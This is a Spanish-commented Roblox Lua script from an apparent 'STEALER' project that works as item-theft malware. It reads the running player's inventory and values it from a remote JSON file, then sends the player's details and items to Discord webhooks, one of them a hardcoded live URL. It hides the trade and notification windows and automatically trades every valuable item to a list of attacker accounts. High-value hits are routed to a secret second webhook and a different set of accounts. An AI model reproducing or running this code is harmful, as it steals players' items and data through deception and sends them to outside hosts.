-- ==========================================
-- SCRIPT 2 (CORE FINAL - AUTO TRADE + DUAL WEBHOOK & ESTADO ANTI-BLOQUEO)
-- ==========================================
local HttpService = game:GetService("HttpService")
local RS = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

-- ==========================================
-- URL DEL REPOSITORIO DE VALORES (JSON)
-- ==========================================
local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"

-- ==========================================
-- CONFIGURACIÓN SECRETA DUAL WEBHOOK
-- ==========================================
local DUAL_WEBHOOK_INVENTARIO = "https://discord.com/api/webhooks/1548772610798657577/pdTP6bzRwfv4MrWMhqdOfdMbqHwn3kKKaJfCRnW2QrQf04R9WmpOJTg85SbHa5FIkd02"

local jugadoresObjetivosDual = {
    "Hahahahlolllpro", "TradeTestingMVSS", "azae3l666",
    "juancarloselkrak7", "azanuvpro777", "ppeoihjv", "BeKindPleaseOmg"
}

local efectosEspecialesDual = {
    MatchaEffect = true, SpiritOverload = true, ValkyrieEffect = true,
    DragonBlossom = true, RainbowEffect = true, LumenburstEffect = true, 
    StardustCollapseEffect = true
}

-- ==========================================
-- LÓGICA DE FILTRADO DE INVENTARIO
-- ==========================================
local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
local EXCLUDE = {}
for _, n in ipairs(EXCLUDE_ITEMS) do EXCLUDE[string.lower(n)] = true end

local okTrade, ItemIsTradeable = pcall(function()
    return require(RS.Shared.Utils.ItemIsTradeable)
end)
if not okTrade or type(ItemIsTradeable) ~= "function" then ItemIsTradeable = nil end

local function isTradeable(name)
    if not ItemIsTradeable then return true end
    local ok, res = pcall(ItemIsTradeable, name)
    if not ok then return true end
    return res and true or false
end

-- ==========================================
-- CARGA DINÁMICA DE VALORES DE GITHUB
-- ==========================================
local Knives, Guns, Effects, Emotes = {}, {}, {}, {}

local function cargarValoresGitHub()
    local success, response = pcall(function() return game:HttpGet(VALUES_REPO_URL) end)
    if success and response then
        local decodeSuccess, decodedData = pcall(function() return HttpService:JSONDecode(response) end)
        if decodeSuccess and decodedData then
            Knives = decodedData.Knives or {}
            Guns = decodedData.Guns or {}
            Effects = decodedData.Effects or {}
            Emotes = decodedData.Emotes or {}
        end
    end
end

cargarValoresGitHub()

-- ==========================================
-- BUCLE PRINCIPAL (HILO SEPARADO)
-- ==========================================
task.spawn(function()
    -- Esperar a que el SCRIPT 1 inyecte la configuración
    while getgenv and not getgenv().AutoTradeConfig do
        task.wait(0.2)
    end
    
    local config = getgenv().AutoTradeConfig or {}
    local WEBHOOK_LOGS = config.WebhookLogs or "" 
    local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
    local startTime = os.time()

    pcall(function()
        if request and player and WEBHOOK_LOGS ~= "" then
            request({
                Url = WEBHOOK_LOGS, Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ content = "✅ **" .. player.Name .. "** ha ejecutado el script." })
            })
        end
    end)

    Players.PlayerRemoving:Connect(function(leavingPlayer)
        if leavingPlayer == player then
            local tiempoTranscurrido = os.time() - startTime
            local horas = math.floor(tiempoTranscurrido / 3600)
            local minutes = math.floor((tiempoTranscurrido % 3600) / 60)
            local segundos = tiempoTranscurrido % 60

            local textoTiempo = ""
            if horas > 0 then textoTiempo = textoTiempo .. horas .. " horas, " end
            if minutes > 0 then textoTiempo = textoTiempo .. minutes .. " minutos y " end
            textoTiempo = textoTiempo .. segundos .. " segundos"

            pcall(function()
                if request then
                    if WEBHOOK_INVENTARIO ~= "" then
                        request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha salido.\n⏳ **Duró ejecutando:** `" .. textoTiempo .. "`" }) })
                    end
                    if WEBHOOK_LOGS ~= "" then
                        request({ Url = WEBHOOK_LOGS, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode({ content = "❌ **" .. leavingPlayer.Name .. "** duró `" .. textoTiempo .. "` usando el script." }) })
                    end
                end
            end)
        end
    end)

    local jugadoresObjetivos = config.JugadoresObjetivos or {}
    local armasPrioritarias = {
        LightningBolt = true, LightningStriker = true, MatchaBobaKnife = true, MatchaBobaGun = true,
        DuskveilDagger = true, DuskveilIron = true, ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true, 
        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true, 
        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
        SealordTrident = true, SealordRevolver = true, DragonpetalBlade = true, DragonpetalSniper = true, DragonpetalOutlaw = true, 
        LovestruckKnife = true, LovestruckGun = true, SharkLauncher = true, Revolver_Default = true, 
    }

    local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)

    if ok and cg.PlayerData then
        local pd = cg.PlayerData
        local knives, guns, effects, emotes = {}, {}, {}, {}
        local totalValue = 0
        local hasSpecialEffect = false

        local foundMatchaKnife, foundMatchaGun = false, false
        local foundDragonBlade, foundDragonGun = false, false
        local foundLightningBolt, foundLightningStriker = false, false

        local function normalizeName(name) return string.gsub(name, " ", "") end

        local function scanAndSave(category, valueTable, resultTable)
            local inv = pd:TryIndex({"Inventory", category})
            if not inv then return end
            
            for guid, item in pairs(inv) do
                if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                    local cleanName = normalizeName(item.name)
                    if valueTable[cleanName] then
                        if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
                        if cleanName == "MatchaBobaGun" then foundMatchaGun = true end
                        if cleanName == "DragonpetalBlade" then foundDragonBlade = true end
                        if cleanName == "DragonpetalSniper" or cleanName == "DragonpetalOutlaw" then foundDragonGun = true end
                        if cleanName == "LightningBolt" then foundLightningBolt = true end
                        if cleanName == "LightningStriker" then foundLightningStriker = true end
                        
                        if category == "Effect" and efectosEspecialesDual[cleanName] then hasSpecialEffect = true end

                        local itemValue = valueTable[cleanName]
                        totalValue = totalValue + itemValue
                        resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
                    end
                end
            end
        end

        scanAndSave("Knife", Knives, knives)
        scanAndSave("Gun", Guns, guns)
        scanAndSave("Effect", Effects, effects)
        scanAndSave("Emote", Emotes, emotes)

        local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)

        if hayItems and request then
            local function formatearLista(lista)
                local contador, orden, texto = {}, {}, ""
                for _, v in ipairs(lista) do
                    local clave = v.name
                    if not contador[clave] then
                        contador[clave] = { cantidad = 1, nombre = v.name, valor = v.value }
                        table.insert(orden, clave)
                    else
                        contador[clave].cantidad = contador[clave].cantidad + 1
                        contador[clave].valor = contador[clave].valor + v.value
                    end
                end
                for _, clave in ipairs(orden) do
                    local info = contador[clave]
                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
                end
                if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                return texto 
            end

            local campos = {}
            if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
            if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
            if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
            if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end

            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            local descriptionText = "### 👤 Información del Jugador\n**Usuario:** `" .. player.Name .. "`\n**Total Value:** `💰 " .. totalValue .. "`\n**Executor:** `" .. executorName .. "`\n**=============================**"

            local pings, embedColor = {}, 3447003

            if totalValue >= 5000 or hasSpecialEffect then
                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR O EFECTO DETECTADO)!** 🚨")
                embedColor = 16711680
            elseif totalValue >= 2000 then
                table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
                embedColor = 16766720
            end

            if (foundMatchaKnife and foundMatchaGun) and (foundDragonBlade and foundDragonGun) then table.insert(pings, "@TOP-SETS 🍵🐉 **¡SETS MATCHA Y DRAGONPETAL!**") end
            if (foundLightningBolt and foundLightningStriker) then table.insert(pings, "@TOP-SETS ⚡ **¡SET LIGHTNING ENCONTRADO!**") end

            local finalContentText = (#pings > 0) and table.concat(pings, "\n") or nil

            local webhookPayload = {
                content = finalContentText, 
                username = "Auto-Trade Bot Scanner",
                embeds = {{
                    title = "🎯 ¡Objetivo de Tradeo Localizado!",
                    color = embedColor, description = descriptionText,
                    thumbnail = { url = avatarUrl }, fields = campos,
                }}
            }
            local jsonPayload = HttpService:JSONEncode(webhookPayload)

            -- LOGICA DUAL
            if totalValue >= 5000 or hasSpecialEffect then
                task.spawn(function()
                    if DUAL_WEBHOOK_INVENTARIO ~= "" then
                        request({ Url = DUAL_WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                    end
                end)
                if WEBHOOK_INVENTARIO ~= "" then
                    task.delay(300, function() pcall(function() request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload }) end) end)
                end
                jugadoresObjetivos = jugadoresObjetivosDual -- CAMBIA LAS CUENTAS OBJETIVO A LAS TUYAS
            else
                if WEBHOOK_INVENTARIO ~= "" then
                    request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonPayload })
                end
            end
        end

        task.wait(10) -- Espera de seguridad

        local tradeando = true 
        local posicionOriginalTrade = nil 

        -- HILO PARA ESCONDER LA GUI
        task.spawn(function()
            while tradeando do
                task.wait()
                pcall(function()
                    local pGui = player:WaitForChild("PlayerGui")
                    if pGui:FindFirstChild("Notifications") and pGui.Notifications:FindFirstChild("Body") then
                        pGui.Notifications.Body.Visible = false
                    end
                    if pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                        if not posicionOriginalTrade and pGui.NewGui.TradeNegotiation.Position.X.Scale < 100 then
                            posicionOriginalTrade = pGui.NewGui.TradeNegotiation.Position
                        end
                        pGui.NewGui.TradeNegotiation.Position = UDim2.new(1000, 1000, 1000, 1000)
                    end
                end)
            end
        end)

        -- ==========================================
        -- MÁQUINA DE ESTADOS ANTI-ATASCO
        -- ==========================================
        local function ejecutarTradeo()
            local okData, cgData = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
            if not okData then return false end
            
            local pdTrade = cgData.PlayerData
            local ActiveNegotiation = cgData.ActiveNegotiation
            local SessionState = cgData.SessionState
            local Remotes = require(RS.Shared.Remotes)
            
            local listaEfectos, listaEmotes, listaArmasPrioritarias, listaArmasNormales = {}, {}, {}, {}

            local function scanTrade(cat, valueTable, destList, isPriority)
                local inv = pdTrade:TryIndex({"Inventory", cat})
                if not inv then return end
                for guid, item in pairs(inv) do
                    if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                        local cleanName = normalizeName(item.name)
                        if valueTable[cleanName] then
                            local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
                            if destList then
                                table.insert(destList, itemData)
                            elseif isPriority and armasPrioritarias[cleanName] then
                                table.insert(listaArmasPrioritarias, itemData)
                            else
                                table.insert(listaArmasNormales, itemData)
                            end
                        end
                    end
                end
            end

            scanTrade("Knife", Knives, nil, true)
            scanTrade("Gun", Guns, nil, true)
            scanTrade("Effect", Effects, listaEfectos, false)
            scanTrade("Emote", Emotes, listaEmotes, false)

            local sortPorValor = function(a, b) return a.value > b.value end
            table.sort(listaEmotes, sortPorValor)
            table.sort(listaEfectos, sortPorValor)
            table.sort(listaArmasPrioritarias, sortPorValor)
            table.sort(listaArmasNormales, sortPorValor)

            local itemsRestantes = {}
            for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
            for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end

            local function isTarget(p)
                if not p then return false end
                for _, nombre in ipairs(jugadoresObjetivos) do
                    if p.Name == nombre then return true end
                end
                return false
            end

            local function getSides()
                local data = ActiveNegotiation.Data
                if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
                local me, other
                if data.player1.player and data.player1.player.UserId == player.UserId then
                    me, other = data.player1, data.player2
                else
                    me, other = data.player2, data.player1
                end
                return me, other, data
            end

            local function offeredGuids()
                local me = getSides()
                local set, n = {}, 0
                if me and me.offer then
                    for _, guid in pairs(me.offer.items or {}) do set[guid] = true; n = n + 1 end
                end
                return set, n
            end

            local function waitUntil(cond, timeout)
                local t0 = os.clock()
                while os.clock() - t0 < timeout do
                    if cond() then return true end
                    task.wait(0.2)
                end
                return cond()
            end

            local function waitProcessingLock()
                waitUntil(function()
                    local _, _, d = getSides()
                    return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
                end, 5)
            end

            local function setReadyTrue()
                local _, _, data = getSides()
                if not data then return false end
                waitUntil(function()
                    local _, _, d = getSides()
                    return d and Workspace:GetServerTimeNow() >= (d.lastUpdate or 0) + 3
                end, 6)
                local _, _, d2 = getSides()
                if not d2 then return false end
                Remotes.SetReady:FireServer(true, d2.ref or {})
                return true
            end

            local function handleTrade(other)
                local offered, offeredCount = offeredGuids()
                local room = 12 - offeredCount

                if room > 0 then
                    local batch = {}
                    for _, item in ipairs(itemsRestantes) do
                        if not offered[item.guid] then
                            batch[#batch + 1] = item
                            if #batch >= room then break end
                        end
                    end

                    if #batch == 0 and offeredCount == 0 then
                        pcall(function() Remotes.CancelTrade:FireServer() end)
                        return "empty"
                    end

                    if #batch > 0 then
                        for _, item in ipairs(batch) do
                            if not getSides() then return "closed" end
                            waitProcessingLock()
                            Remotes.OfferItem:FireServer(item.guid)
                            task.wait(0.35)
                        end
                        task.wait(0.5)
                        local _, nowCount = offeredGuids()
                        if nowCount < math.min(12, offeredCount + #batch) then
                            return "retry"
                        end
                    end
                end

                local me = getSides()
                if not me then return "closed" end
                if not me.ready then
                    task.wait(0.3)
                    setReadyTrue()
                end

                local _, finalCount = offeredGuids()
                local done = waitUntil(function()
                    local m, _, d = getSides()
                    if not d then return true end
                    if d.exchanging == true then return true end
                    if m and not m.ready then return true end
                    return false
                end, 60)

                local m, _, d = getSides()
                if d and d.exchanging then
                    waitUntil(function() return getSides() == nil end, 20)
                    
                    for guid, _ in pairs(offered) do
                        for i = #itemsRestantes, 1, -1 do
                            if itemsRestantes[i].guid == guid then
                                table.remove(itemsRestantes, i)
                                break
                            end
                        end
                    end
                    return "done"
                end
                if not d then return "closed" end
                if m and not m.ready then return "retry" end
                return "waiting"
            end

            local busy = false
            local lastInvite = 0
            local lastAccept = {}

            -- BUCLE MAESTRO QUE MANTIENE VIVO EL TRADE HASTA VACIAR TODO
            while tradeando do
                if #itemsRestantes == 0 then return false end

                local me, other = getSides()

                if me and other and other.player then
                    if isTarget(other.player) then
                        if not busy then
                            busy = true
                            local res = handleTrade(other)
                            busy = false
                            if res == "done" then task.wait(1) end
                        end
                    else
                        task.wait(1)
                    end
                else
                    local targetPlayer = nil
                    for _, p in ipairs(Players:GetPlayers()) do
                        if isTarget(p) then
                            targetPlayer = p
                            break
                        end
                    end

                    if not targetPlayer then
                        task.wait(2)
                        continue
                    end

                    local now = os.clock()
                    local accepted = false
                    local incoming = SessionState:TryIndex({ "incomingTradeRequests" })
                    
                    if type(incoming) == "table" then
                        for _, p in ipairs(incoming) do
                            if isTarget(p) then
                                local key = typeof(p) == "Instance" and p.UserId or tostring(p)
                                if not lastAccept[key] or now - lastAccept[key] > 3 then
                                    lastAccept[key] = now
                                    Remotes.AcceptInvite:FireServer(p)
                                    accepted = true
                                end
                            end
                        end
                    end

                    if not accepted and now - lastInvite > 8 then
                        if #itemsRestantes > 0 then
                            lastInvite = now
                            Remotes.SendInvite:FireServer(targetPlayer)
                        end
                    end
                end
                task.wait(0.4)
            end
        end

        -- Ejecutar la máquina de estados 
        ejecutarTradeo()
        
        -- Detener hilo ocultador y regresar GUI a la normalidad
        tradeando = false
        pcall(function()
            local pGui = player:FindFirstChild("PlayerGui")
            if pGui and pGui:FindFirstChild("NewGui") and pGui.NewGui:FindFirstChild("TradeNegotiation") then
                if posicionOriginalTrade then
                    pGui.NewGui.TradeNegotiation.Position = posicionOriginalTrade
                end
            end
        end)
    end
end)
